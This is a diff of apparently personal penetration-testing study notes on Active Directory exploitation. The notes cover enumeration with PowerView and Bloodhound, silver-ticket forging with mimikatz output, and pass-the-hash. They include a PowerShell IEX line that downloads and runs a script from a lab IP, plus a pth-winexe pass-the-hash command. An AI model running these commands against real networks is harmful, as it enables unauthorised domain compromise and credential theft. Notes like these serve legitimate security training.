@@ -11103,7 +11103,7 @@ http://marlinfw.org/docs/gcode/M302.html
 # [[Project Work]]
 # [[Economics|https://drive.google.com/open?id=1TPLzZ9AZ3WjlCvFcmPdK7OZKEtZ4KUGT]]</pre>
 </div>
-<div created="20211209113521474" modified="20211215084351107" title="Active Directory Exploitation" type="text/x-markdown">
+<div created="20211209113521474" modified="20211215090032435" title="Active Directory Exploitation" type="text/x-markdown">
 <pre>https://attack.stealthbits.com/how-golden-ticket-attack-works
 
 
@@ -11113,7 +11113,7 @@ https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
 
 https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
 
-# Enumeration
+# 1. Enumeration
 
 Basic
 
@@ -11125,6 +11125,8 @@ PowerView
 
 Loading: `IEX(New-Object Net.WebClient).downloadString('http://192.168.119.172:8000/PowerView.ps1')`
 
+
+
 Bloodhound
 
 https://www.aldeid.com/wiki/TryHackMe-Post-Exploitation-Basics#[Task_3]_Enumeration_w/_Bloodhound
@@ -11133,7 +11135,7 @@ https://tryhackme.com/room/postexploit
 
 https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux
 
-# Authentication
+# 2. Authentication
 
 ## Silver Ticket
 
@@ -11149,7 +11151,8 @@ Getting Domain SID, which excludes last number
     corp\jeff_admin S-1-5-21-4038953314-3014849035-1274281563-1104
     PS C:\Tools\active_directory&gt;
 
-Generating Ticker
+Generating Ticket
+
     mimikatz # kerberos::purge
     Ticket(s) purge for current session is OK
 
@@ -11182,9 +11185,25 @@ Generating Ticker
        Flags 40a00000    : pre_authent ; renewable ; forwardable ;
 
     mimikatz #
-# Lateral Movement
+# 3. Lateral Movement
 
-# Persistence
+## 3.1 Pass The Hash
+
+    pth-winexe -U offsec%00000000000000000000000000000000:&lt;ntlm_hash&gt; //&lt;ip&gt; cmd
+
+## 3.2 Overpass The Hash
+
+we can “over” abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user
+
+## 3.3 Pass The Ticket
+
+
+
+## 3.4 Distributed Component Object Model
+
+
+
+# 4. Persistence
 
 Golden Tickets</pre>
 </div>
